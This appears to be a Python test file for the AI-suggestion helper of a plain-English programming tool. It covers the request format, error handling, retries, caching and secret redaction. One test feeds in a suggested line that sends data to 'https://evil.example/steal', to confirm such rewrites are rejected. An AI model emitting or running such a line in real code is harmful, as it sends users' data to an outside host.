"""The Claude helper, with a fake HTTPS POST: no network, no real key, no cost.

The live smoke test at the end asks Claude for real, only with PLAIN_LIVE_AI=1 and ANTHROPIC_API_KEY set.
"""

import http.client
import json
import os
import ssl
import tempfile
import threading
import unittest
import urllib.error
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from unittest import mock

from .support import ROOT  # noqa: F401  (puts src on the path)

os.environ["PLAIN_CACHE"] = tempfile.mkdtemp()

from plainlang import ai, hosts  # noqa: E402
from plainlang.parser import Reader  # noqa: E402

FAKE_KEY = "fake-key-for-tests"     # made up: no test here ever reaches Anthropic
NO_IDEAS = {"rewrites": [], "unsupported": None}


def reply_with(answer, stop_reason="end_turn", status=200):
    """What the Messages API sends back: thinking first, then the answer as a JSON text block."""
    content = [{"type": "thinking", "thinking": "", "signature": "x"},
               {"type": "text", "text": json.dumps(answer)}]
    return status, json.dumps({"type": "message", "role": "assistant", "model": "claude-opus-5-5",
                               "stop_reason": stop_reason, "content": content}).encode()


class FakeClaude:
    """Stands in for ai.https_post. Each reply is (status, body) or an exception to raise; the
    last one is given again for any later request. calls holds each request body, sent the rest."""

    def __init__(self, answer=NO_IDEAS, stop_reason="end_turn", replies=None):
        self.replies = list(replies) if replies else [reply_with(answer, stop_reason)]
        self.calls, self.sent = [], []

    def __call__(self, url, headers, body, timeout):
        self.calls.append(json.loads(body))
        self.sent.append((url, headers, body, timeout))
        reply = self.replies.pop(0) if len(self.replies) > 1 else self.replies[0]
        if isinstance(reply, BaseException):
            raise reply
        return reply


def never_online(*args):
    raise AssertionError("A test tried to reach Claude for real.")


class Offline(unittest.TestCase):
    """A made-up key, no wait before a retry, a fresh cache, and a real request fails the test."""

    def setUp(self):
        for patch in (mock.patch.dict(os.environ, {"ANTHROPIC_API_KEY": FAKE_KEY}),
                      mock.patch.object(ai, "https_post", never_online),
                      mock.patch.object(ai, "RETRY_WAIT", 0)):
            patch.start()
            self.addCleanup(patch.stop)
        os.environ.pop("ANTHROPIC_BASE_URL", None)
        ai.CACHE = Path(tempfile.mkdtemp())


SOURCE = 'read "sales.csv" and call it sales\ncount up the sales over 100\nshow "done"\n'


def problem_of(source):
    program = Reader().read(source)
    return program, program.problems[0]


class Ideas(Offline):
    def setUp(self):
        super().setUp()
        self.folder = tempfile.mkdtemp()

    def ideas(self, answer, source=SOURCE):
        program, problem = problem_of(source)
        fake = FakeClaude(answer)
        raw, _ = ai.ask_claude(program, problem, "report.plain", post=fake)
        return ai.checked_ideas(program, problem, raw, self.folder), fake

    def test_good_ideas_pass(self):
        ideas, client = self.ideas({"rewrites": [
            {"lines": ["show the number of sales where amount is more than 100"], "why": "Counts them."}],
            "unsupported": None})
        self.assertEqual([["show the number of sales where amount is more than 100"]], [i[0] for i in ideas])

    def test_system_block_is_byte_stable(self):
        self.assertEqual(ai.system_prompt(), ai.system_prompt())

    def test_ideas_that_dont_read_are_dropped(self):
        ideas, _ = self.ideas({"rewrites": [{"lines": ["count the sales"], "why": ""},
                                            {"lines": ["print(len(sales))"], "why": ""}], "unsupported": None})
        self.assertEqual([], ideas)

    def test_no_new_web_addresses(self):
        ideas, _ = self.ideas({"rewrites": [
            {"lines": ['send sales to "https://evil.example/steal" and call it reply'], "why": ""}],
            "unsupported": None})
        self.assertEqual([], ideas)

    def test_new_file_names_must_exist(self):
        ideas, _ = self.ideas({"rewrites": [{"lines": ['save sales to "other.csv"'], "why": ""}],
                               "unsupported": None})
        self.assertEqual([], ideas)
        Path(self.folder, "other.csv").write_text("a\n")
        ideas, _ = self.ideas({"rewrites": [{"lines": ['save sales to "other.csv"'], "why": ""}],
                               "unsupported": None})
        self.assertEqual(["changes a file"], ideas[0][2])

    def test_a_line_can_become_steps(self):
        ideas, _ = self.ideas({"rewrites": [{"lines": [
            "repeat for each sale in sales", "    show sale's amount"], "why": ""}], "unsupported": None})
        self.assertEqual(["repeat for each sale in sales", "    show sale's amount"], ideas[0][0])

    def test_secrets_are_hidden_and_put_back(self):
        source = 'set api key to "sk-abcdefghijklmnop1234"\ncount it up\n'
        program, problem = problem_of(source)
        fake = FakeClaude()
        ai.ask_claude(program, problem, "x.plain", post=fake)
        sent = fake.calls[0]["messages"][0]["content"]
        self.assertNotIn("sk-abcdefghijklmnop1234", sent)
        self.assertIn("[hidden", sent)

    def test_cache_is_used_and_checked_again(self):
        answer = {"rewrites": [{"lines": ["show the number of sales"], "why": ""}], "unsupported": None}
        program, problem = problem_of(SOURCE)
        ai.ask_claude(program, problem, "report.plain", post=FakeClaude(answer))
        second = FakeClaude()
        raw, _ = ai.ask_claude(program, problem, "report.plain", post=second)
        self.assertEqual([], second.calls)
        self.assertEqual(answer["rewrites"], raw["rewrites"])


class Request(Offline):
    """The exact request: the same one Plain sent through Anthropic's SDK, as raw HTTPS."""

    def ask(self, fake=None):
        fake = fake or FakeClaude()
        program, problem = problem_of(SOURCE)
        raw, _ = ai.ask_claude(program, problem, "report.plain", post=fake)
        return raw, fake

    def test_address_headers_and_timeout(self):
        _, fake = self.ask()
        url, headers, body, timeout = fake.sent[0]
        self.assertEqual("https://api.anthropic.com/v1/messages", url)
        self.assertEqual({"Content-Type": "application/json",
                          "x-api-key": FAKE_KEY,
                          "anthropic-version": "2026-10-21",
                          "anthropic-beta": "server-side-fallback-2026-07-01",
                          "User-Agent": hosts.USER_AGENT}, headers)
        self.assertEqual(20, timeout)

    def test_body(self):
        _, fake = self.ask()
        program, problem = problem_of(SOURCE)
        message, _, _ = ai.user_message(program, problem, "report.plain")
        self.assertEqual({
            "model": "claude-opus-5-5",
            "max_tokens": 16000,
            "system": [{"type": "text", "text": ai.system_prompt(), "cache_control": {"type": "ephemeral"}}],
            "messages": [{"role": "user", "content": message}],
            "output_config": {"effort": "medium", "format": {"type": "json_schema", "schema": ai.SCHEMA}},
            "fallbacks": "default",
        }, fake.calls[0])

    def test_the_key_goes_only_in_its_header(self):
        _, fake = self.ask()
        url, headers, body, _ = fake.sent[0]
        self.assertNotIn(FAKE_KEY.encode(), body)
        self.assertNotIn(FAKE_KEY, url)
        self.assertEqual(["x-api-key"], [name for name, value in headers.items() if FAKE_KEY in value])

    def test_another_address(self):
        os.environ["ANTHROPIC_BASE_URL"] = "http://127.0.0.1:8080/"
        _, fake = self.ask()
        self.assertEqual("http://127.0.0.1:8080/v1/messages", fake.sent[0][0])

    def test_no_key_means_no_request(self):
        del os.environ["ANTHROPIC_API_KEY"]
        with self.assertRaises(ai.Unavailable) as caught:
            self.ask(FakeClaude())
        self.assertEqual("Tip: Plain can also ask Claude for ideas. See plain-lang.dev/install#ai",
                         str(caught.exception))

    def test_the_json_text_block_is_read_after_other_blocks(self):
        answer = {"rewrites": [{"lines": ["show the number of sales"], "why": "Counts them."}], "unsupported": None}
        reply = {"stop_reason": "end_turn", "content": [
            {"type": "fallback", "from": {"model": "claude-opus-5-5"}, "to": {"model": "claude-opus-4-8"}},
            {"type": "thinking", "thinking": "", "signature": "x"},
            {"type": "text", "text": json.dumps(answer)}]}
        raw, _ = self.ask(FakeClaude(replies=[(200, json.dumps(reply).encode())]))
        self.assertEqual(answer["rewrites"], raw["rewrites"])

    def test_refusal_gives_no_ideas(self):
        raw, _ = self.ask(FakeClaude({"rewrites": [{"lines": ["show 1"], "why": ""}], "unsupported": None},
                                     "refusal"))
        self.assertEqual(NO_IDEAS, raw)
        raw, _ = self.ask(FakeClaude(replies=[(200, b'{"stop_reason": "refusal", "content": []}')]))
        self.assertEqual(NO_IDEAS, raw)

    def test_a_reply_that_isnt_an_answer_gives_no_ideas(self):
        for body in (b"<html>", b"[]", b'{"stop_reason": "end_turn", "content": []}',
                     b'{"stop_reason": "end_turn", "content": [{"type": "text", "text": "{\\"rewr"}]}'):
            with self.subTest(body=body):
                ai.CACHE = Path(tempfile.mkdtemp())
                raw, _ = self.ask(FakeClaude(replies=[(200, body)]))
                self.assertEqual(NO_IDEAS, raw)


class Errors(Offline):
    """Each failure becomes the same one plain line Plain showed before, and never the key."""

    def failure(self, *replies):
        fake = FakeClaude(replies=list(replies))
        program, problem = problem_of(SOURCE)
        with self.assertRaises(ai.Unavailable) as caught:
            ai.ask_claude(program, problem, "report.plain", post=fake)
        self.assertNotIn(FAKE_KEY, str(caught.exception))
        return str(caught.exception), len(fake.calls)

    def test_each_status(self):
        for status, words, tries in (
                (401, "Plain couldn't use your Anthropic key. Check ANTHROPIC_API_KEY. Here are Plain's own ideas.", 1),
                (402, "Your Anthropic account needs billing set up first (see plain-lang.dev/install#ai). "
                      "Here are Plain's own ideas.", 1),
                (403, "Your Anthropic key isn't allowed to use Claude this way. Here are Plain's own ideas.", 1),
                (429, "Claude is busy right now, so try again in a minute. Here are Plain's own ideas.", 2),
                (400, "Claude had a problem (code 400). Here are Plain's own ideas.", 1),
                (404, f"Claude doesn't have the model \"{ai.MODEL}\". Check PLAIN_AI_MODEL. "
                      "Here are Plain's own ideas.", 1),
                (500, "Claude had a problem (code 500). Here are Plain's own ideas.", 2),
                (503, "Claude had a problem (code 503). Here are Plain's own ideas.", 2),
                (529, "Claude had a problem (code 529). Here are Plain's own ideas.", 2)):
            with self.subTest(status=status):
                self.assertEqual((words, tries), self.failure((status, b'{"type": "error"}')))

    def test_no_connection(self):
        words = "Plain couldn't reach Claude (no internet connection). Here are Plain's own ideas."
        for error in (urllib.error.URLError(OSError("no route")), TimeoutError(), ConnectionResetError(),
                      http.client.RemoteDisconnected("closed"), http.client.IncompleteRead(b"")):
            with self.subTest(error=type(error).__name__):
                self.assertEqual((words, 2), self.failure(error))

    def test_a_failed_certificate_check_sends_nothing_and_isnt_retried(self):
        error = urllib.error.URLError(ssl.SSLCertVerificationError(1, "certificate verify failed"))
        words, tries = self.failure(error)
        self.assertEqual(1, tries)
        self.assertEqual(ai.CERTIFICATES, words)
        self.assertIn("plain-lang.dev/help#certificates", words)

    def test_an_address_urllib_cant_use(self):
        self.assertEqual(("Plain couldn't reach Claude. Here are Plain's own ideas.", 1),
                         self.failure(ValueError("unknown url type")))

    def test_one_retry_then_an_answer(self):
        answer = {"rewrites": [{"lines": ["show the number of sales"], "why": ""}], "unsupported": None}
        for first in ((429, b""), (500, b""), (529, b""), urllib.error.URLError(OSError("no route"))):
            with self.subTest(first=first):
                ai.CACHE = Path(tempfile.mkdtemp())
                fake = FakeClaude(replies=[first, reply_with(answer)])
                program, problem = problem_of(SOURCE)
                raw, _ = ai.ask_claude(program, problem, "report.plain", post=fake)
                self.assertEqual(2, len(fake.calls))
                self.assertEqual(answer["rewrites"], raw["rewrites"])

    def test_ctrl_c_isnt_a_failure(self):
        program, problem = problem_of(SOURCE)
        with self.assertRaises(KeyboardInterrupt):
            ai.ask_claude(program, problem, "report.plain", post=FakeClaude(replies=[KeyboardInterrupt()]))


class Recorder(BaseHTTPRequestHandler):
    """A local stand-in for the Messages API, so the real urllib code runs with no internet."""
    seen = []

    def log_message(self, *args):
        pass

    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        type(self).seen.append((self.path, dict(self.headers), body))
        status = 429 if self.path.startswith("/busy") else 200
        reply = reply_with(NO_IDEAS)[1] if status == 200 else b'{"type": "error"}'
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(reply)))
        self.end_headers()
        self.wfile.write(reply)


class RealPost(unittest.TestCase):
    """https_post itself, against a server on this computer."""

    @classmethod
    def setUpClass(cls):
        cls.server = ThreadingHTTPServer(("127.0.0.1", 0), Recorder)
        cls.base = f"http://127.0.0.1:{cls.server.server_port}"
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def test_it_sends_the_headers_and_body(self):
        Recorder.seen.clear()
        status, body = ai.https_post(self.base + "/v1/messages", ai.request_headers(FAKE_KEY), b'{"a": 1}', 5)
        self.assertEqual(200, status)
        self.assertEqual("end_turn", json.loads(body)["stop_reason"])
        path, headers, sent = Recorder.seen[0]
        self.assertEqual(("/v1/messages", b'{"a": 1}'), (path, sent))
        self.assertEqual(FAKE_KEY, headers["X-Api-Key"])
        self.assertEqual("2026-10-21", headers["Anthropic-Version"])
        self.assertEqual("server-side-fallback-2026-07-01", headers["Anthropic-Beta"])

    def test_an_error_status_comes_back_as_a_status(self):
        status, _ = ai.https_post(self.base + "/busy", ai.request_headers(FAKE_KEY), b"{}", 5)
        self.assertEqual(429, status)

    def test_no_server_raises_oserror(self):
        free = ThreadingHTTPServer(("127.0.0.1", 0), Recorder)
        port = free.server_port
        free.server_close()
        with self.assertRaises(OSError):
            ai.https_post(f"http://127.0.0.1:{port}/v1/messages", ai.request_headers(FAKE_KEY), b"{}", 5)

    def test_https_checks_certificates_with_plains_own_context(self):
        seen = {}

        def urlopen(request, timeout, context):
            seen.update(timeout=timeout, context=context)
            raise urllib.error.URLError(OSError("offline"))
        with mock.patch.object(ai.urllib.request, "urlopen", urlopen), self.assertRaises(OSError):
            ai.https_post("https://api.anthropic.com/v1/messages", ai.request_headers(FAKE_KEY), b"{}", 20)
        self.assertIs(hosts.web_context(), seen["context"])
        self.assertEqual(20, seen["timeout"])


class Fixer(unittest.TestCase):
    def test_pick_an_idea_and_save(self):
        from plainlang.fixer import fix_file
        folder = Path(tempfile.mkdtemp())
        path = folder / "hello.plain"
        text = "show Hello there\n"
        path.write_text(text)
        program = Reader().read(text)
        import io
        import contextlib
        with contextlib.redirect_stdout(io.StringIO()):
            fixed, new_text = fix_file(path, text, program, {"ai": False}, ask=lambda prompt: "1")
        self.assertIsNotNone(fixed)
        self.assertEqual('show "Hello there"\n', path.read_text())
        self.assertEqual(text, (folder / "hello.plain.bak").read_text())


class Splicing(unittest.TestCase):
    def test_keeps_notes_newlines_and_bom(self):
        from plainlang.fixer import splice
        text = "﻿set x to 1\r\n    show Hello  # say hi\r\nshow x\r\n"
        out = splice(text, 2, ['    show "Hello"'])
        self.assertEqual('﻿set x to 1\r\n    show "Hello"  # say hi\r\nshow x\r\n', out)


@unittest.skipUnless(os.environ.get("PLAIN_LIVE_AI") == "1" and os.environ.get("ANTHROPIC_API_KEY"),
                     "asks Claude for real: set PLAIN_LIVE_AI=1 and ANTHROPIC_API_KEY")
class Live(unittest.TestCase):
    def test_claude_answers(self):
        ai.CACHE = Path(tempfile.mkdtemp())
        program, problem = problem_of(SOURCE)
        raw, _ = ai.ask_claude(program, problem, "report.plain")
        self.assertTrue(ai.valid_answer(raw))


if __name__ == "__main__":
    unittest.main()
